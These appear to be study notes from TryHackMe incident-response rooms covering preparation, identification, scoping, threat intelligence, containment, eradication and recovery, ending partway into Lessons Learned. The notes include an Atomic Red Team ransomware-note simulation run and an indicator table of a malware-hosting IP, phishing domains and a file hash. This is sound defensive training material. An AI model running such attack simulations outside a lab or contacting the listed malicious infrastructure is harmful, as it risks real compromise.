Ransomware Atomic Test Run

```powershell
PS C:\Users\Administrator>Invoke-AtomicTest T1486 -ShowDetailsBrief

T1486-5 PureLocker Ransom Note

PS C:\Users\Administrator>Invoke-AtomicTest T1486-5
PathToAtomicsFolder = C:\AtomicRedTeam\atomics

Executing test: T1486-5 PureLocker Ransom Note
Done executing test: T1486-5 PureLocker Ransom Note
```

Navigating through the Windows Event Logs, under the `Application and Service Logs -> Microsoft -> Windows -> Sysmon -> Operational` we
 can confirm that our test was successful and a log entry was created 
for it by searching for the test we ran. It is easier to use the **Find** feature to identify the event due to the influx of logs being recorded since the service was enabled.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/c247ea5088292e45411cdc677a62f0e0.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/c247ea5088292e45411cdc677a62f0e0.png)

## Wrapping up

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/16edf47301103d89bd4079374b326bd1.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/16edf47301103d89bd4079374b326bd1.png)

Establishing an incident response process is vital to any 
organisation, and preparation is at the forefront of this process. As we
 have covered in the room, the **Preparation** step of the IR Lifecycle covers various aspects around people, policies, and technology.

Setting
 up your organisation with the proper training, defining the correct 
policies and procedures, and having visibility through log and event 
monitoring ensures you are on hand to tackle any adversarial attempts.

Various frameworks within the field cover the best practices for incident response. Among them is the [Computer Security Incident Handling Guide](https://nvlpubs.nist.gov/nistpubs/specialpublications/nist.sp.800-61r2.pdf) by NIST.

As
 you have gathered information and set up your visibility, it is time to
 go into the Incident Response Lifecycle's Identification and Scoping 
stages.

## **IDENTIFICATION AND SCOPING**

**Identification: Unearthing the Existence of a Security Incident**

The **Identification** phase forms the bedrock of the Incident 
Response Process. This critical phase combines the technical detection 
of potential security incidents with the inherent human capacity to 
recognise and report them.

The speed at which an organisation can spot an incident directly 
correlates with the pace of response, potentially limiting the damage 
and shortening recovery time.

# The Triad of Identification: People, Process, and Technology

Identification is a harmonious concert between people, processes, and technology.

While technology offers the tools to detect potential incidents 
through alerts, people must interpret these alerts and adhere to 
established procedures to ensure incidents are correctly identified and 
managed.

Moreover, all, not solely the IT or Security teams, must report any 
anomalies and ensure that the relevant parties are alerted by following 
the appropriate procedures.

Consequently, the success of the identification phase rests on a well-coordinated collaboration among these three elements.

Understanding Security Alerts and Event Notifications

[Untitled Database](SOC%20L2%207205cfa1075b47969372b40e2125686d/Untitled%20Database%2089502012d54043199ee74eb963b835ce.csv)

Leveraging Technical Expertise and Security Tools

Effective incident response relies on timely reporting, staff proficiency, and strategic use of security technologies.

Therefore, it's crucial that all employees of an organisation, 
technical or otherwise, stay alert and promptly report any suspicious 
activities or anomalies through the appropriate communication channels.

Employing robust security technologies can significantly enhance the
 detection and deterrence of potential threats, ensuring rapid 
recognition and response to situations that may escalate into actual 
security incidents.

It is why TryHackMe is dedicated to supporting those pursuing a 
career in Blue teaming to master security tools by offering a platform 
that can aid individuals in developing proficiency in areas specific to 
Security Operations and Incident Response tooling, such as the 
following:

[Untitled Database](SOC%20L2%207205cfa1075b47969372b40e2125686d/Untitled%20Database%209675021db2ab4b0b99afbda429c9816a.csv)

Recognising that these security tools truly flourish in the hands of 
skilled individuals with the necessary information and technical 
expertise to combat potential threats and manage security incidents is 
vital.

However, effective communication channels are just as essential to 
ensure that the right people are quickly alerted with accurate and 
precise information, which enables them to conduct an investigation and 
initiate the incident response process, made possible only by 
well-designed procedures that both technical and non-technical staff can
 swiftly and seamlessly follow.

Promoting a Culture of Learning and Vigilance

[Untitled Database](SOC%20L2%207205cfa1075b47969372b40e2125686d/Untitled%20Database%20678b87253bbb49a5b58470865d2bce96.csv)

# Transitioning from Identification to Scoping

Once an incident has been identified, the subsequent step is determining its scope.

Scoping involves grasping the extent of the incident, including 
which systems are affected, what data is at risk, and how the incident 
impacts the organisation.

The transition from identification to scoping is crucial in the 
Incident Response Process, demanding clear communication, effective 
collaboration, and a well-defined process. The insights gained from the 
identification phase will prove instrumental in facilitating this 
transition and strengthening the effectiveness of the incident response 
process.

**Scoping: Understanding the Extent of a Security Incident**

After **identification**, the next critical step in the Incident Response Process is **Scoping**,
 which involves determining the extent of a security incident, including
 identifying the affected systems, the type of data at risk, and the 
potential impact on the organisation.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/63da722f2d207d0049da10b1/room-content/fe831672cca3ae6d8616cf09719f5aa4.svg](https://tryhackme-images.s3.amazonaws.com/user-uploads/63da722f2d207d0049da10b1/room-content/fe831672cca3ae6d8616cf09719f5aa4.svg)

Scoping is essential as it guides the subsequent steps of the 
response process and helps formulate an effective mitigation strategy.

# The Asset Inventory: A Quick Reference for Incident Response

The Asset Inventory is a crucial tool in the incident response 
process. It provides a comprehensive list of all the organisation's 
assets, aiding in identifying and scoping potential threats. Let's look 
at a simple representation of the Asset Inventory.

| Asset Type | Asset Name | IP Address | Operating System | Owner |
| --- | --- | --- | --- | --- |
| Domain Controller | DC-01 | 172.16.1.10 | Windows Server 2019 | Derick Marshall |
| Mail Server | MAILSVR-01 | 172.16.1.15 | Windows Server 2019 | Stan Simon |
| Web Server | WEBSVR-01 | 172.16.1.110 | Ubuntu Server 20.04 | Damian Hall |
| Proxy Server | PROXY-01 | 172.16.1.119 | Windows Server 2019 | Stan Simon |
| Workstation | WKSTN-02 | 172.16.1.151 | Windows 10 Pro | Michael Ascot |
| Laptop | LPTP-01 | 172.16.1.153 | Windows 10 Pro | Derick Marshall |

# The Spreadsheet of Doom (SoD): Enriching Artefacts for Effective Incident Response

Identifying, understanding, and responding to potential threats 
within the known scope of a security incident as swiftly as possible is 
critical.

The

**Spreadsheet of Doom (SoD)**

is designed to aid in these processes, acting as a consolidated, organised source of information about known threats.

It serves as a single reference point, accelerating the incident 
response procedure. Each row in this spreadsheet is representative of a 
unique threat identifier or an Indicator of Compromise (IoC).

| Indicator Type | Indicator | Threat Type | Source |
| --- | --- | --- | --- |
| IP Address | 188.40.75.132 | Malware Hosting | AlienVault OTX |
| Domain | b24b-158-62-19-6.ngrok-free.app | Phishing domain | Ticket#2023012398704232 |
| Email address | alex.swift@swiftspend.finance | Spoofed email | Ticket#2023012398704232 |
| Email address | mike.ascot@swiftspend.finance | Spoofed email | Ticket#2023012398704232 |
| Domain | groupmarketingonline.icu | Phishing domain | VirusTotal |
| File Hash (SHA1) | 75ec7d0d1b6b2b4c816cbc1b71cd0f8f06bd8c1b | Malware | ThreatCrowd |

The SoD
 is essentially a structured list of IoCs, including IP addresses, 
domain names, URLs, file hashes, and more associated with malicious 
activity. The data in this spreadsheet is enriched with additional 
information about each IoC, such as its source, the type of threat it is
 linked to, and more.

This additional context can aid incident responders in quickly 
understanding the nature of a security incident and potential threats. 
Moreover, it provides a historical reference that can be used for 
tracking recurring threats and observing patterns in cyberattacks.

The SoD is more than just a list - it's a dynamic, comprehensive 
resource that centralises crucial information, streamlines communication
 among incident response teams, and ultimately empowers faster, more 
effective responses to potential threats.

The **Asset Inventory** and **Spreadsheet of Doom** are indispensable tools in **Scoping**
 the extent of a security incident. These tools can be used as quick 
references and fact sheets, enabling efficient correlation and 
enrichment of artefacts by providing a comprehensive overview of 
relevant information about an incident at a glance. By continually 
updating and referring to both tools,  incident response teams can stay 
one step ahead and take a more proactive approach to incident response.

**Identification and Scoping Feedback Loop: An Intelligence-Driven Incident Response** 

**Process**

The **Identification and Scoping** phase of the Incident Response
 Process is not a linear progression but a feedback loop continually 
refining our understanding of the incident and its scope.

This loop becomes intelligence-driven when it leverages current 
investigation data, enriching it with information from past incidents, 
correlated logs from various data sources, advanced analytics and 
machine learning to enhance awareness by adding more context to a 
developing situation.

[Untitled Database](SOC%20L2%207205cfa1075b47969372b40e2125686d/Untitled%20Database%2000fad73926574fbdb5724ec434277d30.csv)

# The Power of an Intelligence-Driven Feedback Loop

A feedback loop driven by intelligence in the **Identification and Scoping** phase encourages a proactive and dynamic method towards incident response.

This proactive approach facilitates an ongoing education and 
exchange of information, enabling organisations to respond to security 
incidents and safeguard their systems efficiently.

It also ensures compliance with legal obligations for privacy and data protection.

Organisations can boost their incident response prowess and 
efficiently counteract security incidents by capitalising on real-time 
data concerning emerging threats, cultivating an environment of ongoing 
education and exchange of information, and guaranteeing privacy and data
 protection.

**Conclusion**

The Identification and Scoping phase of the Incident Response 
Process is a critical juncture that requires a well-coordinated effort 
between people, processes, and technology. Here, the nature of security 
alerts is discerned, and the extent of the incident is determined.

This phase is a balancing act, requiring technical expertise, 
effective use of security tools, and a culture of continuous learning 
and vigilance.

We've explored the importance of understanding security alerts, the 
role of technical expertise and security tools, and cultivating a 
culture of learning and vigilance. We've also delved into the 
significance of following proper procedures to ensure that incidents are
 accurately identified and managed, ensuring that the appropriate 
individuals capable of addressing them are notified.

Remember, the success of the identification phase hinges on a 
well-orchestrated collaboration between these elements. You can 
significantly enhance your organisation's incident response capabilities
 by fostering a culture of awareness and vigilance and leveraging the 
right tools and processes.

## **THREAT INTEL AND CONTAINMENT**

This room is going to introduce you to what containment involves, as well as some containment strategies. Additionally, this room is going to introduce what threat intelligence is and how it can be used to understand our adversary.

You will use some of the Indicators Of Attack (IOA) & Indicators Of Compromise (IOC) from the module in the practical element of this room to analyse some threat intelligence.

Containment is a crucial phase in incidence response because the core aim is to minimise the damage caused by an incident and prevent further damage. For example, we can prevent our adversary from accessing other devices by containing infected devices. - containment is a fantastic way to preserve and record evidence that can be used in forensic analysis.

Effective containment is essential in restoring normal operations. Once a threat has been successfully contained, normal day-to-day operations can continue.

Threat intelligence, briefly, is the knowledge gained from collecting and analyzing intelligence about a threat actor. Intelligence such as IP addresses can be used to identify a specific threat actor or, for example, analyse their tactics, techniques, and procedures (TTPs). More on this later.

**Pre-Containment**

This stage of the process focuses on the steps necessary to prevent an incident from having further impact.

You
 will be looking to gather as much information as possible about the 
incident and the adversary.  For example, collecting evidence from 
infrastructure such as Intrusion Detection Systems (IDS) and [Security and Information Management Systems](https://tryhackme.com/room/introtosiem) (SIEMS).  This evidence will form Indicators of Compromise (IOCs).

We can begin looking at our perimeter defence systems for this information. For example, looking at our setup of ELK with [packetbeat](https://www.elastic.co/beats/packetbeat), we can see that a workstation has downloaded an executable. Perhaps a user has clicked on a malicious PDF?

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/3a0043abe6dc7408c9e47f0579e3ecc7.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/3a0043abe6dc7408c9e47f0579e3ecc7.png)

With
 this information, we can identify the workstation that has potentially 
been compromised.  We can then further analyse this system to gather 
further evidence for containment. To illustrate, we can gather the hash 
of this downloaded file.

Getting the hash of the downloaded executable (Windows)

```powershell
PS C:\Users\MichaelAscot\Downloads> Get-FileHash dropper.exe

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
SHA256          84BDE632C5BFD2A7FF84E579E6F7561543CA0AAD6D8E7275DAE5926BA4F561C1       C:\Users\MichaelAscot\Downlo...
```

Getting the hash of the downloaded executable (Linux)

```
ubuntu@tryhackme:~$ sha256sum dropper.exe84BDE632C5BFD2A7FF84E579E6F7561543CA0AAD6D8E7275DAE5926BA4F561C1  dropper.exe
```

With this evidence, we now know that any host with this file is presumed to be infected. We can start creating detection alerts for this file's presence or the attacker's IP address. For example, using a SIEM such as [Wazuh](https://tryhackme.com/room/wazuhct) to check for the presence of this file on any device.

Assembling
 threat intelligence like this is paramount to the pre-containment stage
 because it allows us to link activity to any previous campaigns or 
attribute new behaviours to a threat actor.

**Containment Strategies**

There are a few containment strategies to consider when actioning the
containment phase of the incidence response. It is important to consider
what strategy is suitable as they all have their pros and cons.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/29b4c245acef492887dd01d17ad9775e.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/29b4c245acef492887dd01d17ad9775e.png)

Containment can be considered as the bridge between the
identification, scoping and eradication, and recovery phases of the
incidence response process.

**Isolation**

**Entire isolation** is considered to be a pretty aggressive -
but effective - strategy. This strategy involves the incidence response
team completely isolating the infected device(s). This can be through
network segmentation or physical.

As previously stated, this is pretty aggressive and is noticeable
from the adversary. For example, they might realise they can no
longer access the infected device(s) and have been discovered. Once an
adversary notices this, they may rush to complete their action on
objectives. Alternatively, they may change their focus to a
compromised system that hasn’t been noticed yet.

For the sake of this room, action on objectives is the adversary
achieving what they initially set out to do. This could be stealing
data, or causing maximum damage to the organisation (i.e. start deleting
files or damaging systems), to name a few.

When choosing this strategy, you should consider the following:

- How aggressive do you want the isolation to be?
- Is the adversary likely to rush their action on objectives? Threat intelligence can be used to help determine this.
- Do we understand the adversary enough yet? Perhaps controlled isolation would be more useful here if we do not.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/26fe7f189310b37634a52310d401f192.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/26fe7f189310b37634a52310d401f192.png)

# Controlled Isolation

**Controlled isolation** is a less aggressive
strategy in containment. Although, it isn’t entirely risk-free.

This strategy involves the incidence response team closely monitoring
the adversary’s actions. Rather than strictly isolating the infected system(s), the
team would keep the system accessible to not tip off the
adversary.

An incident response team can gather vital information and 
intelligence about the adversary by allowing the adversary to continue.

However, the adversary isn’t given free-roam. For example, the 
incident response team can prevent access if the adversary is about to 
perform something destructive such as wiping or exfilling data. A good
“cover story” can be made to convince the adversary why
they’ve suddenly lost access. For example, an announcement could be made
that routine maintenance is occurring.

The ultimate aim is to understand our adversaries here without
tipping them off to the fact that they are being monitored. Ultimately,
it’s a “cat and mouse” game between the incidence response team and
the adversary.

When choosing this strategy, you should consider the following:

- What is the risk of allowing the adversary to continue?
- Do we know enough about the adversary already?
- If so, perhaps full-on isolation would be best.
- Do we have the appropriate means to stop an adversary before they do something destructive? Can we allocate the resources and human power to closely and constantly monitor the adversary?

# Linking Together

The
 threat intelligence and containment strategies bridge the gap between 
the incident response process's identification, scoping, eradication, 
and recovery phases. Furthermore, with good threat intelligence,  we 
have good identification. Threat intelligence is an ever-going process, 
as you will come to discover in later tasks

**Creating Threat Intelligence**

It
 is important to understand what threat intelligence looks like. Threat 
intelligence is anything that can be attributed to a malicious actor. 
Some common forms of threat intelligence include:

- IP Addresses
- File Hashes
- Domains
- File Names (I.e. toolkits)
- Patterns, activity or techniques of known threat campaigns (TTPs)

# Tactics Techniques Procedures (TTPs)

These
 three ingredients are used to describe the aims, techniques and methods
 of a threat actor. These are extremely important in understanding how 
the threat actor operates. For example, what toolkits do they use? What 
are the threat actor's objectives? Are they trying to steal data or 
trying to cause damage to the organisation? Is there a criminal or 
political reason behind their attack?

I've broken down the three ingredients below:

**Tactics:**
 This ingredient is the high-level objectives that the threat actor aims
 to achieve. For example, are they trying to steal data or corporate 
secrets? Perhaps they're trying to blackmail the organisation or are 
attacking for bragging rights.

**Techniques:** This ingredient 
is the specific tools or methods the threat actor employs to achieve 
their tactics. For example, how did the adversary gain entry? Phishing?
 Are they targeting any specific software or service? What methods are 
the adversary using to privilege escalate or laterally move across the 
network?

**Procedures:** This ingredient looks at the attack 
chain used by the adversary. For example, what is the entire process 
from initial access to action on objectives? To illustrate, a procedure 
could be phishing -> credential stealing -> accessing a privileged
 user account -> laterally moving -> stealing sensitive 
information.

By understanding the TTPs of a threat actor, we can 
tailor our response to the cyber threat. We can also build a picture of 
how the threat actor behaves.

# Threat Intelligence Platforms

Multiple
 threat intelligence platforms are available that aid in distributing 
threat intelligence. For example, OpenCTI is a framework that allows the
 collaborative sharing of threat intelligence. In this scenario, we can 
see the generated report for the *tal0nix* adversary in the OpenCTI framework.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/cad942e9c8bb43c4eee320edbcd1d49d.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/cad942e9c8bb43c4eee320edbcd1d49d.png)

Analysts
 will be able to link up this report with another entry, whereas a user 
has reported accidentally entering their Office 365 credentials on a 
phishing page:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/dea0e40de0b578b0bded48b28e2d421c.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/dea0e40de0b578b0bded48b28e2d421c.png)

Staying in the loop and subscribing to community threat intelligence feeds such [DigitalSide Threat Intel](https://osint.digitalside.it/), [AlienVault](https://otx.alienvault.com/), and [threatfeeds.io](https://threatfeeds.io/) is
 extremely important. It allows you, as a responder, to use the history 
of the threat actor to predict future behaviour potentially. If you are 
able to understand where the adversary might go next, you can begin to 
implement the necessary containment measures to prevent the threat actor
 from proceeding.

Of course, using public threat intelligence feeds such as those listed previously in this task, you can arm your SIEM with the necessary alerts before the incident occurs, as seen in the screenshot below.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/f5f15456f7bd589aff0e2120475c8a53.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/f5f15456f7bd589aff0e2120475c8a53.png)

Additionally, there should be appropriate channels for users within an organisation to report suspicious e-mails or documents. For
 example, Perry at SwiftSpend Finance sent an IT colleague a potentially
 malicious e-mail (screenshot below). This is not a good process because
 no clear avenue exists for reporting suspicious attachments. Perry, in 
this case, just chose Damian because he works with computers. And, of 
course, by re-attaching the PDF to the e-mail to Damian, Perry has just 
(unknowingly and with good intentions!) furthered the risk in the 
organisation.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/c351436db09a187861025074e41a1cd9.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/c351436db09a187861025074e41a1cd9.png)

**Threat Intelligence Creation Feedback Loop**

I want to emphasise how threat intelligence is essential in driving
the identification, scoping, and containment phases. For
example, threat intelligence can be used to understand the adversary. Is
the adversary an Advanced Persistent Threat (APT)? IP addresses or filenames can be used to determine
this.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/5be2cc90b62269f6a05d9cac88af9fa4.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/5be2cc90b62269f6a05d9cac88af9fa4.png)

If the adversary is known, perhaps we can understand their potential
action on objectives or methodology from published reports, etc.

It’s important to remember that the end goal of containment is to
make it difficult for the adversary to achieve their goals. It can be
considered as “buying time” for the incidence response team.

Of course, there’s a tricky balance between “collecting all of the
intelligence” and giving the adversary enough time to complete their
goal. Understanding the adversary quickly will allow us to make an 
effective containment strategy. Can we understand the adversary
enough to predict where they’re going next? If so, then we can secure 
those systems ahead of time.

**Whack-a-mole**

It is understandable why an organisation may want to eradicate the adversary immediately. However, without adequately
scoping and creating threat intelligence with an effective containment
strategy, we may miss exactly how truly compromised we are.

Without understanding what systems are compromised, we risk being
complacent. For example, backing up and restoring a compromised system
and calling it a day (thinking that is it) may lead to us allowing the
adversary to harbour on other systems.

Building a better understanding of the adversary leads to a better 
incident scope. In turn, better scope of the incident means creating a 
more intelligent and effective containment strategy, ultimately leading 
to more control over the
adversary.

# Positive Feedback Loops

The
 pre-containment and threat intelligence creation stages of the IR 
process play an essential role in later stages of the IR process (such 
as recovery and lessons learned). Furthermore, when looking back at the 
incident, we can determine if our current setup was sufficient for the 
incident. Did we miss anything? Perhaps we could track the adversary in 
our network, but there was too much noise in the SIEM that made it difficult to analyse on a real-time basis.

Could
 any lessons be learnt to prevent the breach in the future? Collecting 
threat intelligence is an ongoing process for a defensive team.

**Conclusion**

# A Re-cap

Again, at the risk of repetition, I want to highlight just how
important threat intelligence plays in the identification and scoping, and containment phases of incidence response.

Threat intelligence and containment is an ongoing evolving process.
It is not simply done once, rather, it continues as the incident evolves.

Choosing the appropriate containment strategy is paramount. For
example, if we are too aggressive, we’re going to tip off the adversary 
and potentially rush them into performing more damaging actions. Or, for
example, missing out on the chance to create important threat
intelligence or forensic evidence.

Now that you have successfully gathered threat intelligence and
implemented an effective containment strategy, you are now ready for the
eradication, remediation, and recovery stages of the incident

# Incident Response Frameworks and Guidelines

Of course, as is often the case with cyber security, frameworks for 
this process exist which outline the best practices. For example, the [Computer Security Incident Handling Guide](https://nvlpubs.nist.gov/nistpubs/specialpublications/nist.sp.800-61r2.pdf) published by NIST, or the NCSC (UK GOV)'s [Incident Management](https://www.ncsc.gov.uk/collection/incident-management). Finally, the following [cheatsheet](https://www.sans.org/media/score/504-incident-response-cycle.pdf)
 published by SANS can be a helpful reminder in the incidence response 
cycle. It is worth checking out the aforementioned resources for 
additional reading.

## **ERADICATION AND REMEDIATION**

This
 phase of the incident response process is arguably the most important; 
but more important to keep in mind is that it is also the easiest to 
execute incorrectly. It is not uncommon for security teams to implement 
eradication plans, only to see themselves being in a worse position than
 before. As such, it is only prudent to keep in mind the following 
considerations before diving into (and during the implementation of) 
this phase.

# Premature Shift from Scoping to Eradication

Moving to this step too soon is not 
uncommon and has been the cause of unsuccessful eradication phases for a
 lot of organizations. Pressure from the management, or even internal 
pressure from the team, may result in the uninformed / misinformed move 
to this phase, and it almost always stems from fear of losing more data 
or important business information to the threat actor.

However, fully understanding the 
incident - knowing the threat actor and the full scope of their damage, 
is critical to gain the most benefit from this phase. Skipping this and 
going straight for the kill won’t really kill it, instead it’s more than
 likely to lead to the threat actor knowing they’ve been found; it’s 
grim, and you end up worse off. Sadly, it’s the reality for a lot of IR teams and organizations.

Premature eradication may cause the 
attacker to think that you already have a complex and detailed 
eradication plan in motion and may lead to the attacker expediting their
 exfiltration process, destroying or causing more damage to the systems 
they have control over, and spreading more persistence mechanisms all 
over the network.

Doing this may also introduce a 
“whack-a-mole” cycle wherein you keep discovering and identifying bad, 
eradicating it, finding it elsewhere in the environment, and doing it 
all over again. Some organizations attribute this to progress, but is it
 really progress when it just displaced the problem elsewhere? This 
cycle can be prevented through proper scoping and adapting an 
intelligence-driven approach.

# Be Prepared for (Initial) Failure Anyway

Even if you didn’t rush through the 
Identification and Scoping phase of your response process, and you think
 that you’ve already mapped out all of the attacker's traces, it is not 
unusual for the initial attempt at remediation to fail. Don’t be 
discouraged when it happens — this is where the importance of the 
feedback loop between the eradication and scoping phases become most 
apparent.

And even when a threat gets fully 
remediated, it should be expected that the threat actor will try again. 
Also, expect that the attacks will be more sophisticated and even be 
harder to detect, more so catch. Threat actors nowadays are really 
really good — they are well versed in avoiding detection and more often 
than not, when they do get detected, it’s because they wanted to get 
detected at that particular stage (or they got careless!).

With all of these in mind, it is 
important to not lose faith in the process. Remember that responding to 
an incident is an ongoing process that tends to be cyclic; trust the 
feedback that you get from threat intelligence developed from the 
scoping phase, and in turn, throw some feedback in that direction as 
well. This way, the whole process is fully informed and sooner or later,
 a more effective remediation plan may be developed and implemented.

# Main Goal

Keep in mind that the main goal of this phase is twofold:

1. Eradicate the bad guys: Consider the sensitivity / criticality of some systems
(by themselves, and in relation to other systems that have been
compromised too; what’s the best way to prioritize the more beneficial
for the organization to recover as soon as possible?)
2. Recover from the business impact that the bad guys may have caused: Go back to the state of normalcy

**Eradication Techniques**

# Automated Eradication

Some malwares can be automatically 
quarantined, cleaned up, and removed by tools such as Anti-Viruses (AVs)
 and EDRs. However, keep in mind that this is most effective on less 
sophisticated threats that employ well-known malicious tooling. Unique 
or targeted threats employed by more sophisticated bad guys are usually 
purpose-built to bypass these automated detection and prevention systems
 and so relying solely on this method is not advised.

Nonetheless, automated eradication is an advantage in such a way that analysts may shift their focus on more complex threats.

# Complete System Rebuild

The most straightforward way to 
eradicate attacker traces from a specific endpoint is to completely 
rebuild it. Wiping the system clean of everything ensures the system has
 a clean slate, however, the downside is that this approach is absolute.
 All of the ‘normal’ contents will be removed along with all of the bad 
ones and so it is necessary to reinstall all applications, revert all 
configurations, and restore all wiped data so it functions as good as it
 was before the compromise, if not better.

Take note that this approach entails 
downtime for the system. When deciding which eradication technique fits 
the compromise scenario best, the decision is also influenced by the 
allowable downtime the resources in question have. Some organizations 
have ‘legacy’ resources where a downtime of a few minutes could cost the
 organization millions of $$ and so a complete rebuild may completely be
 out of the question.

# Targeted System Cleanup

There are instances where the 
repercussions for failure are just too great that the security team 
cannot risk allowing the attacker to know that they have already been 
detected and awaiting cleanup. As discussed earlier, it is not uncommon 
for the security team to reveal their cards prematurely, only for the 
attackers to perform drastic measures that end up damaging the 
environment more than it already is.

There are also instances where 
downtime for a specific system is just simply out of the picture as it 
would entail a lot of money lost for the company.

These kinds of cases are more 
sensitive in nature, and so, a targeted way of cleaning up attacker 
traces should be planned and executed with speed and precision, all 
while being intelligence-driven.

Take note that success in this phase 
is heavily reliant on how well the scoping has been done. Going back to 
the pitfalls of improper scoping, if the organization decides to rush 
scoping and immediately go to Eradication, it will eventually just lead 
to failure.

Remediation

This
 phase of the Incident Response process doesn’t end in the removal of 
attacker tools and traces, rather, it’s just the beginning. In order for
 the effects of the Eradication techniques to last, an effective 
Remediation and Recovery strategy should take place in conjunction with 
it. More so, ideally the three should be planned together and then 
consequently executed like clockwork.

# Remediation

During the course of the IR
 process, the organization would have learned a lot about their security
 posture. Proper identification must have been done such that the 
vulnerabilities and / or misconfigurations that allowed the attacker to 
thrive in the environment are clearly identified. On the other hand, 
there will also be a lot of insights with regards to where the 
organization is good at, such as the method of discovery of the threat 
actor, the level of visibility within the network and the endpoints of 
the organization, and even the way the response is done upon discovery 
of malicious behavior.

These learnings 
would ideally give birth to plans for changes within the environment to 
make the organization’s security posture better. These plans should 
bridge the gap between the things that the organization did well in, and
 the things that the organization missed that led to the compromise.

In general, typical remediation steps start with, but are not limited to, the following:

Network Segmentation

Implementing
 network segmentation that’s designed in such a way that only absolutely
 necessary communication takes place between specific computers and 
subnets greatly reduces the attack surface that a threat actor can play 
with.

Effective
 remediation plans would also implement methods that would enhance the 
security team’s visibility of the network. When implemented, weird 
network behavior indicative of maliciousness may be easily noticed, 
making way for easier detection and prevention mechanisms.

Identity and Access Management Review

Restrict Access to Compromised Accounts

Compromised accounts identified during the IR
 process should be reviewed. The mode of compromise (e.g., plaintext 
password, vulnerable application running under the user’s context, etc.)
 ideally should be removed during the eradication phase and be 
immediately patched in this phase.

User
 account entitlements should also be reviewed. Following the principle 
of least privilege, the user account should have access to only the 
absolutely necessary pieces of data, applications, or resources. With 
this, the user can still perform their job function, while at the same 
time ensuring that the account is not used for purposes other than what 
is necessary, maliciously or otherwise.

Restrict Access to Highly Privileged Accounts

Access
 to highly privileged accounts such as domain administrators should be 
controlled and audited as well. For some organizations, access to these 
kinds of accounts is granted on a request-and-approval basis and are 
usually only granted for very specific business needs. More so, some 
only grant access for a specific period of time.

When
 threat actors gain access to a highly privileged account, we can only 
imagine what they can do to the environment. They would have an absolute
 free reign over the areas where this particular account has access to. 
As such, it would be in our best interest not to let them get there in 
the first place.

Patch Management

Cleanup,
 as expected, is done during the eradication part of this phase. 
However, if we don’t remediate the root cause that made the compromise 
possible (e.g., the exploitation of a vulnerable application), it will 
remain a low-hanging fruit waiting to be picked by another threat actor.

Patching
 pre-identified vulnerable tools and applications that are being used in
 the environment should be a priority here, and ideally should be rolled
 out across the entire environment, not just on the affected endpoints. 
Furthermore, having a good patch management system that would track 
applications used within the environment, constantly being ready for 
vulnerabilities discovered as they happen, and applying their 
corresponding patches moving forward, is the ideal way to go.

# Recovery

This
 is where the changes that would bring systems back online happen. In 
this phase, the goal is to be able to continue normal business 
operations and so, a good recovery plan is one that would give the 
organization that opportunity.

Changes
 done during the remediation phase are geared towards strengthening the 
security posture of the organization. During the recovery phase, we reap
 the rewards of those efforts, while at the same time making sure that 
1) they are all done properly, and 2) no stones were left unturned.

Continuous Testing and Monitoring

Once
 vulnerabilities have been remediated through the reduction of attack 
surface area and patching, among others, the organization should employ 
tests to see if the remediation tactics that they have employed will 
hold against attacks of similar nature. This is done through penetration
 tests and attack simulations.

This
 will essentially create a feedback loop that would consistently test 
and improve the defensive additions put in place. Once we’re satisfied, 
only then can we trust the safe reintroduction of these systems back 
into production.

However, the 
work does not stop here - it is through the continuous application of 
these tests, not only on the systems being reintroduced, but also on the
 rest of the environment in general, do we gain the full value of the 
lessons we’re learning from the incident.

Backups

It
 is also during the recovery phase that we restore the function of the 
affected systems back into normalcy. As such, the importance of keeping 
backups, not only of data but also of the esoteric setups that unique 
systems have is ought to be emphasized. The latter is especially true 
when the particular compromised system ends up undergoing a complete 
system rebuild.

As such, 
remember that having a detailed documentation is great. However, having 
built automated setup scripts from these documentations, and having it 
ready for when the time comes that it is needed is greater!

Alternative:
 If your environment is cloud-based, or at least part of it is, keeping 
updated baseline images of systems is always best to have.

Action Plan for Recovery

Implementing
 all of these changes doesn’t happen overnight. Some of these changes 
are more straightforward and can be done on the fly, while others might 
need to involve multiple teams and consistent streams of approvals from 
the C-suite to be accomplished. It is indeed a daunting task, but it’s 
not a race, and as already been discussed previously, it is a continuous
 process.

Action plans are 
typically planned for in the near, mid, and long term, depending on the 
organization’s capability and capacity to plan and implement. Near-term 
changes should be composed of the most critical ones and should be 
prioritized and started immediately. It is also sensible to start with 
the ones that would immediately be of value.

## **LESSONS LEARNED**

This phase of the IR process is essentially a sit-down with the data that you’ve gathered throughout the IR
 process and the learnings gained from them. This isn’t the most 
exciting part of the process in terms of getting your hands dirty and 
fighting in the field, and as such, may easily be neglected or skipped 
